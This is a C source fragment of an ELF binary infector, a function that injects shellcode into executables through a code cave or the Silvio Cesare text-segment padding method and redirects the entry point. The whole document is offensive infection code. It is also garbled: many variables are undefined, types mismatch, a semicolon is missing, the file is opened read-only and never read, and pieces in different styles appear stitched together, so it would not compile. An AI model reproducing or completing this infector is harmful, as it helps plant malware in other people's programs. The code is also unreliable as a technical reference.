int binject_ELF(char *file,char *shellcode,int method)
{
  uint32_t size;
  int i,x;
  int sclen=strlen(shellcode);
  FILE *f;
  f=fopen(file,"r");
  fseek(f,0,SEEK_END);
 size=ftell(f);
  char *file_buffer = calloc(1,size);
  char *address=file_buffer;
  struct Elf32_Ehdr ehdr=(struct Elf32_Ehdr*)address;
  if(method==CODE_CAVE)
  {
	  address+=ehdr->sh_offset;
  for(i=0;i<ehdr.shnum;i++)
  {       
	  struct Elf32_shdr shdr=(struct Elf32_Shdr*)address;
	  uint32_t section_start=Shdr->sh_offset;
	  uint32_t section_end=Shdr->sh_offset + shdr->sh_size;
       x=find_code_cave(sclen,section_start,section_end,file_buffer);
                        if(x!=0)
			{
                        memcpy(file_buffer+x,shellcodefixed,sclen+5)
			fwrite(file_buffer,1,size,f);
			free(shellcodefixed);
			free(file_buffer);
			fclose(f);
			return 0;
		        
			}
				section_start+=shdr->sh_size;
  }
                        if(x!=0)
                        return 1;
                        }
  if(method==SILVIO_METHOD)
  {
	  for (phdr = (Elf32_Phdr *)pdata, i = 0; i < ehdr.e_phnum; i++) {
		if (offset) {
			phdr->p_offset += 4096;
		} else if (phdr->p_type == PT_LOAD && phdr->p_offset == 0) {
/* 
	is this the text segment ? Nothing says the offset must be 0 but it
	normally is.
*/
			
			ehdr.e_entry = p_vaddr+p_filesz;
			

			phdr->p_filesz += vlen;
			phdr->p_memsz += vlen;
		}

		++phdr;
	}
	  if (offset == 0) goto error;

/* patch the offset */
	*(long *)&v[vhoff] = offset;

/* read the shdr's */

	if (lseek(fd, ehdr.e_shoff, SEEK_SET) < 0) goto error;
	if (read(fd, (void *)sdata, slen) != slen) goto error;

/* update the shdr's to reflect the insertion of the parasite */

	for (shdr = (Elf32_Shdr *)sdata, i = 0; i < ehdr.e_shnum; i++) {
		if (shdr->sh_offset >= offset) {
			shdr->sh_offset += PAGE_SIZE;
/* is this the last text section? */
		} else if (shdr->sh_addr + shdr->sh_size == evaddr) {
/* if its not strip safe then we cant use it */
			if (shdr->sh_type != SHT_PROGBITS) goto error;

			shdr->sh_size += vlen;
		}

		++shdr;
	}

/* update ehdr to reflect new offsets */

	oshoff = ehdr.e_shoff;
	if (ehdr.e_shoff >= offset) ehdr.e_shoff += PAGE_SIZE;

}
           
  free(file_buffer);
}
